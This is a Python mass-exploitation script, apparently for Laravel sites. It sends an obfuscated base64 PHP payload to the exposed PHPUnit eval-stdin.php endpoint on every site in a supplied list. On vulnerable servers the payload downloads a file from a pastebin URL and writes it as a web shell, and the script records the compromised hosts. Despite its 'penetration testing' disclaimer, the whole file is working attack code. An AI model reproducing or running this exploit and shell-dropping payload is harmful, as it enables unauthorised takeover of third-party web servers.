import requests, re, os, sys, importlib, warnings
from multiprocessing.dummy import Pool
from urllib.parse import urlparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from platform import system
warnings.simplefilter('ignore', InsecureRequestWarning)
importlib.reload(sys)


def url_check(url):
    if url[(-1)] == '/':
        check1 = re.compile('(.*)/')
        site = re.findall(check1, url)
        url = site[0]
    if url[:7] != 'http://' and url[:8] != 'https://':
        url = 'http://' + url
    return url


def shell_up(url, shell_3, replace1):
    try:
        shell_pay = "<?php eval('?>'.base64_decode('PD9waHAKZnVuY3Rpb24gdXBsb2FkKCR1cmwsICRpc2kpIHsKCSRmcCA9IGZvcGVuKCRpc2ksICJ3Iik7CgkkY2ggPSBjdXJsX2luaXQoKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwpOwoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0JJTkFSWVRSQU5TRkVSLCB0cnVlKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIGZhbHNlKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GSUxFLCAkZnApOwoJcmV0dXJuIGN1cmxfZXhlYygkY2gpOwoJY3VybF9jbG9zZSgkY2gpOwoJZmNsb3NlKCRmcCk7CglvYl9mbHVzaCgpOwoJZmx1c2goKTsKfQppZih1cGxvYWQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9icXNZaTR1SiIsImludHJ1ZDNyLnBocCIpKSB7CgllY2hvICJJbnRydWQzciI7Cn0gZWxzZSB7CgllY2hvICJmYWlsIjsKfQo/Pg==')); ?>"
        session1 = requests.session()
        user_agent1 = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'}
        req_1 = session1.get(shell_3, headers=user_agent1, data=shell_pay, verify=False, timeout=30)
        if req_1:
            try:
                req_2 = session1.get(replace1, headers=user_agent1, verify=False, timeout=30)
                if 'Intrud3r' in req_2.text:
                    print( ' \033[1;32;40m[+] ' + url + ' \033[1;32;40m[Shell Uploaded]')
                    open('Shells.txt', 'a').write(replace1 + '\n')
                else:
                    print( ' \033[1;37;40m[-] ' + url + ' \033[1;37;40m[Not Vuln]')
            except:
                pass

        else:
            print( ' \033[1;37;40m!! ' + url + ' \033[1;37;40mUnknown Error ')
    except:
        print( ' \033[1;37;40m!! ' + url + ' \033[1;37;40mUnknown Error ')


def scan(url):
    try:
        all_path = [
         '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
         '/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php']     #Add more PATH if you wish
        
        for path in all_path:
            try:
                shell_pay2 = "<?php eval('?>'.base64_decode('PD9waHAKZnVuY3Rpb24gdXBsb2FkKCR1cmwsICRpc2kpIHsKCSRmcCA9IGZvcGVuKCRpc2ksICJ3Iik7CgkkY2ggPSBjdXJsX2luaXQoKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwpOwoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0JJTkFSWVRSQU5TRkVSLCB0cnVlKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIGZhbHNlKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GSUxFLCAkZnApOwoJcmV0dXJuIGN1cmxfZXhlYygkY2gpOwoJY3VybF9jbG9zZSgkY2gpOwoJZmNsb3NlKCRmcCk7CglvYl9mbHVzaCgpOwoJZmx1c2goKTsKfQppZih1cGxvYWQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9icXNZaTR1SiIsImludHJ1ZDNyLnBocCIpKSB7CgllY2hvICJJbnRydWQzciI7Cn0gZWxzZSB7CgllY2hvICJmYWlsIjsKfQo/Pg==')); ?>"
                replace1 = url + path.replace('eval-stdin.php', 'intrud3r.php')
                shell_3 = url + path
                session2 = requests.session()
                user_agent2 = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'}
                req_3 = session2.get(shell_3, headers=user_agent2, data=shell_pay2, verify=False, timeout=30)
                if 'Intrud3r' in req_3.text:
                    print( ' \033[1;31;40m[+] ' + url + ' \033[1;31;40m[Vuln]')
                    open('vuln.txt', 'a').write(shell_3 + '\n')
                    shell_up(url, shell_3, replace1)
                    break
                else:
                    print(' \033[1;37;40m[-] ' + url + ' \033[1;37;40m[Not Vuln]')
            except:
                print( ' \033[1;37;40m!! ' + url + ' \033[1;37;40mUnknown Error ')

    except:
        print( ' \033[1;37;40m!! ' + url + ' \033[1;37;40mUnknown Error ')


def check(url):
    try:
        url = url_check(url)
        user_agent = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'}
        session0 = requests.session()
        req_0 = session0.get(url, headers=user_agent, verify=False, timeout=30)
        if req_0.status_code == 200:
            scan(url)
        else:
            print( ' [-] ' + url + ' [404]')
    except:
        pass


def logo():
    clear = "\x1b[0m"

    banner = """\033[1;32;40m
    ____              __     ____      __                 _______     
   / __ \____  ____  / /_   /  _/___  / /________  ______/ /__  /_____
  / /_/ / __ \/ __ \/ __/   / // __ \/ __/ ___/ / / / __  / /_ </ ___/
 / _, _/ /_/ / /_/ / /_   _/ // / / / /_/ /  / /_/ / /_/ /___/ / /    
/_/ |_|\____/\____/\__/  /___/_/ /_/\__/_/   \__,_/\__,_//____/_/                                                                           
\033[1;33;40m  Root Intrud3r Laravel Auto Exploiter v1 \n
\033[1;32;40m     by Abid Ahmad \033[1;36;40m[Root_Intrud3r]

 \033[1;31;40m This scipt is made for penetration testing purposes.
 \033[1;31;40m Do not use for malicious actity.
 \033[1;31;40m I'm not responsible for any kind of illegal usage 
 \033[1;31;40m Use at your own risk. \n
"""
    print(banner)
    
logo()

def Main():
    list = input('\033[1;37;40m Site List : ')
    list = open(list, 'r').read().splitlines()
    try:
        ThreadPool = Pool(100)
        Threads = ThreadPool.map(check, list)
    except:
        pass


if __name__ == '__main__':
    Main()